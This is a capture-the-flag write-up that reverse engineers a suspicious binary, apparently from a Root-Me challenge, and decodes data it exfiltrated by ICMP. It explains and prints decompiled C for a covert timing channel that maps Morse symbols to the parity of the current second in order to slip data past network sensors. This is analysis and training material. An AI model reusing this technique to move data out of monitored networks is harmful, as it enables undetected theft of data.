Difficulty : Medium (3/5)
# About

The SOC detected an intrusion on an administration server. Realized from the exterior with the admin credentials. But he was absent in the meantime. We suspect that the password has been previously compromised but no trace of that on the sensors.

The N1 analysts isolated, the day before, a suspicious ICMP traffic. The alert criteria is the length and the shape of the payload, incoherent with Linux.

The on site team successfully gathered a suspicious binary, with its name looking like its linked directly to the SOC's detection.

Find the ex-filtered data.

# Enumeration

We have a `pcapng` capture file and a `icmp_emission` binary.

```bash
> ls
capture.pcapng  icmp_emission
```

Let's inspect the `icmp_emission` binary with binwalk.

```bash
> binwalk icmp_emission

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
17455         0x442F          Unix path: /home/m4tou/ROOTME/challenge_ICMP

> file icmp_emission
icmp_emission: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4a7dd65445f10c4c52bcd78b42199ab9baf997ad, for GNU/Linux 3.2.0, with debug_info, not stripped
```

ELF (Executable and Linkable Format) is **a standard file format for executable files, object code, shared libraries and core dumps**. Linux and many UNIX-like operating systems use this format.

When we execute the binary, it displays 'Wrong!'

```bash
> ./icmp_emission
Wrong!
```

Maybe try to reverse engineer the file to see what it does exactly ?

I used Ghidra for the first time to open the file :

```C

int main(int argc,char **argv)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  char *pcVar4;
  double dVar5;
  double dVar6;
  char **argv_local;
  int argc_local;
  sockaddr_in dst;
  int sec;
  double t;
  double start;
  int last_sec;
  char *my_strange_abc;
  int sock;
  int sent;
  int i;
  
  if (argc == 3) {
    iVar2 = socket(2,3,1);
    if (iVar2 < 0) {
      perror("socket");
      iVar2 = 1;
    }
    else {
      dst.sin_zero[0] = '\0';
      dst.sin_zero[1] = '\0';
      dst.sin_zero[2] = '\0';
      dst.sin_zero[3] = '\0';
      dst.sin_zero[4] = '\0';
      dst.sin_zero[5] = '\0';
      dst.sin_zero[6] = '\0';
      dst.sin_zero[7] = '\0';
      dst.sin_family = 2;
      dst.sin_port = 0;
      dst.sin_addr.s_addr = 0;
      inet_pton(2,argv[2],&dst.sin_addr);
      pcVar4 = blur_text(argv[1]);
      for (i = 0; pcVar4[i] != '\0'; i = i + 1) {
        if (pcVar4[i] == ' ') {
          usleep(1500000);
        }
        else {
          bVar1 = false;
          dVar5 = now();
          while (!bVar1) {
            dVar6 = now();
            if (8.0 <= dVar6 - dVar5) break;
            dVar6 = now();
            uVar3 = (int)dVar6 % 0x3c;
            if ((uVar3 != 0xffffffff) &&
               ((((pcVar4[i] == '/' && (uVar3 == 0)) ||
                 ((pcVar4[i] == '.' && (((uVar3 & 1) == 0 && (uVar3 != 0)))))) ||
                ((pcVar4[i] == '-' && ((int)uVar3 % 2 == 1)))))) {
              send_icmp(iVar2,&dst);
              bVar1 = true;
            }
            usleep(50000);
          }
          if (!bVar1) {
            printf("Timeout %c\'\n",(ulong)(uint)(int)pcVar4[i]);
          }
        }
      }
      close(iVar2);
      iVar2 = 0;
    }
  }
  else {
    puts("Wrong!");
    iVar2 = 1;
  }
  return iVar2;
}

```

# Reverse Engineering :
## Covert Timing Channel

We have a C main file here, that takes two arguments.

The two arguments argv[1] and argv[2] are being transformed in these lines : 
```C
inet_pton(2,argv[2],&dst.sin_addr);
pcVar4 = blur_text(argv[1]);
```

The **InetPton** function converts an IPv4 or IPv6 Internet network address into its standard text presentation form into a digital binary form. The ANSI version of this function is **inet_pton**.

The blur_text function is apparently a custom function from this code. Let's inspect what it does. From the name, it looks like an encoding function.

```C
char * blur_text(char *in)

{
  char cVar1;
  size_t sVar2;
  char *in_local;
  char c;
  int i;
  
  blur_text::out[0] = '\0';
  in_local = in;
  do {
    if (*in_local == '\0') {
      return blur_text::out;
    }
    if ((*in_local < 'a') || ('z' < *in_local)) {
      cVar1 = *in_local;
    }
    else {
      cVar1 = *in_local + -0x20;
    }
    i = 0;
    while (ABC_TABLE[i].c != '\0') {
      if (cVar1 == ABC_TABLE[i].c) {
        strcat(blur_text::out,ABC_TABLE[i].m);
        sVar2 = strlen(blur_text::out);
        (blur_text::out + sVar2)[0] = ' ';
        (blur_text::out + sVar2)[1] = '\0';
        break;
      }
      i = i + 1;
    }
    in_local = in_local + 1;
  } while( true );
}
```

function that takes a string, transforms it to uppercase if its between 'a' and 'z', otherwise lets it as is.

## Conversion table

Then, we have ABC_TABLE. A data structure containing a char and a char `*`, the actual character and its value in morse code :


![char](listing-char.png)

values of A, B, C in morse code in the table :

![char](morse-value.png)

So, the function parses every character of a string, converts from 'a' to 'z' in uppercase and lets the other characters as they are, and then converts each character to morse code, separated by a space between every letter.

Let's return to the main function, now that we understood what is being sent.

`dVar6` is the value returned by the now() function. A custom written function : 

```C
double now(void)

{
  timeval tv;
  
  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
  return (double)tv.tv_usec / 1000000.0 + (double)tv.tv_sec;
}
```

Gets the unix timestamp in seconds and microseconds and returns something like this : `1717849335.345678`

`uVar3 = (int)dVar6 % 0x3c;`

`0x3c` is hexadecimal value of 60. Using the modulo operator, we calculate the rest of the division by 60.
so `uVar3` contains the current second of the current minute.

## Understanding the main algorithm

Look at the send_icmp transmission condition:

- `pcVar4[i] == ‘/’ && (uVar3 == 0)`

	If the Morse character is a slash / (which is often used to separate words in Morse code), the program waits until the current second is exactly 0 (the very beginning of a minute) to send the ping.

- `pcVar4[i] == ‘.’ && (((uVar3 & 1) == 0 && (uVar3 != 0)))`

	If it is a period ., it checks (uVar3 & 1) == 0. This is a binary operation (Bitwise AND), which is a highly optimized way to check if a number is even.
	Therefore, periods are sent on even seconds (2, 4, 6, 8... 58).

- `pcVar4[i] == ‘-’ && ((int)uVar3 % 2 == 1)`

	If it is a hyphen -, it checks uVar3 % 2 == 1, which means the second is odd.
	So, the hyphens are assigned to odd seconds (1, 3, 5, 7... 59).


# Analysis and results

Now that I understood the mechanism and this rule, the goal is to analyse the `capture.pcapng` file, and associate every ICMP timestamp value with a morse character.
I could do it manually but it will be very long and prone to errors, so I create a script in python to analyse the file for me :

## Python script

Here the goal is to open the pcap file, analyse the time frame between two ICMP requests, and analyse if the current second of the ICMP request is odd or even, and reconstructing the morse string. It is pretty straightforward since I had access to all the info in Ghidra to reconstruct the morse dict.

Please find the script at [icmp_morse.py](./icmp_morse.py)

# Result

```bash
> python3 icmp_morse.py
[opening file] : capture.pcapng
[OK] EXTRACTION OVER !
[*] MORSE CODE : .-./--/-.--./.--/xxxxx/..--../-.--.-

[+] Flag / : RM(xxxxx???)
```

# Learned :

Learned another attack vector (bypassing the radar by sending a message out of the network via ICMP). Covert Timing Channel

Used Ghidra for the first time to reverse engineer the malicious script and understanding the mechanism.

Created a python script to decode morse code from an ICMP capture.
